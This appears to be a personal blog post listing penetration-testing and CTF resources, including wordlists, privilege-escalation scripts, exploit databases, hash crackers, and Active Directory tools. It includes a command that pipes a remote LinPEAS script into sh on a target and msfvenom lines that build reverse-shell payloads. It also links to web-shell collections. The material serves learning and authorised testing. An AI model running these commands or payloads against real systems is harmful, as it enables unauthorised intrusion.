---
title: "Essential Cybersecurity Resources"
date: 2026-02-13
draft: false
tags: ["resources", "tools", "reference"]
categories: ["Resources"]
summary: "A curated list of essential tools, references, and cheat sheets for penetration testing and CTF challenges."
showtoc: true
tocopen: true
---

# Essential Cybersecurity Resources

A curated list of the tools and references I find myself coming back to time and time again. Bookmarking this page is probably a good idea.

---

## Wordlists & Payloads

### SecLists
**Link**: https://github.com/danielmiessler/SecLists

The gold standard wordlist collection. Has everything - usernames, passwords, fuzzing payloads, web shells, and more. If you're only installing one wordlist repo, make it this one.

```bash
sudo apt install seclists
# or
git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists
```

### RockYou
**Link**: Pre-installed on Kali at `/usr/share/wordlists/rockyou.txt`

The classic password wordlist. Leaked from the RockYou breach containing 14 million real-world passwords. Default go-to for password cracking.

```bash
# Kali ships it compressed - unzip first
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### CeWL
**Link**: https://github.com/digininja/CeWL

Custom wordlist generator - crawls a target website and generates a wordlist from the content. Useful when default wordlists aren't cutting it.

---

## Privilege Escalation

### LinPEAS / WinPEAS
**Link**: https://github.com/peass-ng/PEASS-ng

The go-to privilege escalation enumeration scripts. LinPEAS for Linux, WinPEAS for Windows. Checks hundreds of potential vectors automatically and colour codes findings by severity.

```bash
# Download and run LinPEAS directly on target
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer and run
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### GTFOBins
**Link**: https://gtfobins.github.io

Curated list of Unix binaries that can be exploited to bypass local security restrictions. Essential for Linux privilege escalation - if you find a SUID binary or a sudo permission, check here first.

### LOLBAS (Living Off The Land Binaries)
**Link**: https://lolbas-project.github.io

The Windows equivalent of GTFOBins. Documents Windows binaries, scripts, and libraries that can be used for malicious purposes - useful for Windows privesc and AV evasion.

### PayloadsAllTheThings
**Link**: https://github.com/swisskyrepo/PayloadsAllTheThings

Massive collection of payloads and bypasses for virtually every vulnerability type. Has dedicated sections for privesc, web vulnerabilities, file inclusion, SSRF, and much more. Incredibly comprehensive.

---

## Vulnerability Databases & Exploit References

### Exploit-DB
**Link**: https://www.exploit-db.com

The definitive public exploit database maintained by Offensive Security. Searchable archive of exploits and vulnerable software. Use `searchsploit` on Kali to search offline:

```bash
searchsploit apache 2.4
searchsploit -m 12345  # Copy exploit to current directory
```

### Rapid7 Vulnerability Database
**Link**: https://www.rapid7.com/db/

Rapid7's vulnerability and exploit database. Great for researching CVEs and finding corresponding Metasploit modules. Particularly useful for understanding real-world impact of vulnerabilities.

### CVE Mitre
**Link**: https://cve.mitre.org

The official CVE database. When you find a CVE number, this is the authoritative source for details.

### NVD (National Vulnerability Database)
**Link**: https://nvd.nist.gov

NIST's vulnerability database - more detailed than Mitre, includes CVSS scores and patch information.

---

## Shells & Payloads

### Reverse Shell Cheat Sheet (RevShells)
**Link**: https://www.revshells.com

The best reverse shell generator. Enter your IP and port, pick your language, get your shell. Supports bash, Python, PHP, PowerShell, netcat, and dozens more. Saves so much time.

### PayloadAllTheThings - Reverse Shells
**Link**: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Comprehensive reverse shell cheatsheet - useful when RevShells doesn't have what you need.

### MSFVenom Cheat Sheet
**Link**: https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom

Reference for generating payloads with msfvenom. Useful for creating staged/stageless shells for specific architectures.

```bash
# Basic examples
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o shell.php
```

### Web Shells
**Link**: https://github.com/TheBinitGhimire/Web-Shells

Collection of web shells for various languages. Also check `/usr/share/webshells/` on Kali for built-in options.

---

## Web Application Testing

### Burp Suite
**Link**: https://portswigger.net/burp

The industry standard web application testing proxy. Community edition is free and covers most CTF needs. Essential for intercepting, modifying, and replaying HTTP requests.

### OWASP Top 10
**Link**: https://owasp.org/www-project-top-ten/

The definitive list of the most critical web application security risks. If you're testing a web app, this is your checklist.

### HackTricks
**Link**: https://book.hacktricks.xyz

Comprehensive pentesting book covering virtually every attack technique. Excellent for methodology when you're stuck - covers web, network, Active Directory, cloud, and more.

### PortSwigger Web Security Academy
**Link**: https://portswigger.net/web-security

Free, hands-on web security training by the makers of Burp Suite. Covers every major vulnerability class with labs. Excellent for deep-diving into specific techniques.

---

## Password Cracking

### Hashcat Wiki
**Link**: https://hashcat.net/wiki/

Reference for hash modes, attack types, and rules. When you're not sure which `-m` flag to use, check here.

```bash
# Common hash modes
hashcat -m 0    # MD5
hashcat -m 100  # SHA1
hashcat -m 1000 # NTLM
hashcat -m 1800 # SHA-512 crypt (Linux /etc/shadow)
hashcat -m 3200 # bcrypt
```

### Hashes.com
**Link**: https://hashes.com/en/decrypt/hash

Online hash lookup/cracker. Sometimes faster than cracking locally for common hashes.

### CrackStation
**Link**: https://crackstation.net

Another online hash cracker with a massive pre-computed lookup table. Great for quick wins on MD5/SHA1 hashes.

### Hash Identifier
**Link**: https://www.onlinehashcrack.com/hash-identification.php

Not sure what type of hash you're looking at? Paste it here.

```bash
# Or use hash-identifier on Kali
hash-identifier
# or
hashid 'yourhashhere'
```

---

## Network & Enumeration

### Nmap Documentation
**Link**: https://nmap.org/docs.html

Official Nmap docs. The cheat sheet is particularly useful:

```bash
# Common scan types
nmap -sC -sV -oN initial TARGET     # Default scripts + version detection
nmap -p- --min-rate 5000 TARGET     # All ports, fast
nmap -sU --top-ports 20 TARGET      # Top UDP ports
nmap -A TARGET                       # Aggressive scan
```

### Wireshark
**Link**: https://www.wireshark.org

Network protocol analyser. Essential for packet analysis challenges and understanding traffic.

---

## Active Directory

### BloodHound
**Link**: https://github.com/BloodHoundAD/BloodHound

Active Directory attack path visualisation tool. If you're doing AD boxes, this is essential for finding privilege escalation paths.

### CrackMapExec
**Link**: https://github.com/byt3bl33d3r/CrackMapExec

Swiss army knife for Active Directory environments. Network scanning, credential testing, lateral movement.

### Impacket
**Link**: https://github.com/fortra/impacket

Collection of Python scripts for working with network protocols. Essential for AD attacks - includes psexec, secretsdump, GetUserSPNs and more.

---

## CTF Platforms

### TryHackMe
**Link**: https://tryhackme.com

Beginner-friendly guided learning. Great structured learning paths for different specialisations.

### HackTheBox
**Link**: https://www.hackthebox.com

More challenging, less guided. Closer to real-world pentesting scenarios.

### PicoCTF
**Link**: https://picoctf.org

Excellent for beginners. Covers web, forensics, crypto, binary exploitation, and reverse engineering.

### CTFtime
**Link**: https://ctftime.org

Aggregator for CTF competitions worldwide. Find upcoming CTFs and read team writeups.

---

## Learning & Reference

### MITRE ATT&CK Framework
**Link**: https://attack.mitre.org

Comprehensive matrix of adversary tactics and techniques based on real-world observations. Useful for understanding the bigger picture of how attacks chain together.

### Cybersecurity Career Roadmap
**Link**: https://roadmap.sh/cyber-security

Visual roadmap for cybersecurity learning paths. Good for identifying gaps in your knowledge.

### IppSec (YouTube)
**Link**: https://www.youtube.com/@ippsec

HackTheBox walkthroughs by one of the best in the community. Essential viewing for learning methodology.

### TCM Security (YouTube)
**Link**: https://www.youtube.com/@TCMSecurityAcademy

Practical ethical hacking content. Excellent free courses on their channel.

---

## Quick Reference Cheat Sheets

| Resource | Link |
|----------|------|
| GTFOBins | https://gtfobins.github.io |
| LOLBAS | https://lolbas-project.github.io |
| RevShells | https://www.revshells.com |
| HackTricks | https://book.hacktricks.xyz |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| ExploidDB | https://www.exploit-db.com |
| CrackStation | https://crackstation.net |
| OWASP Top 10 | https://owasp.org/www-project-top-ten |

---

*This list is always evolving - I'll keep adding resources as I find useful ones.*
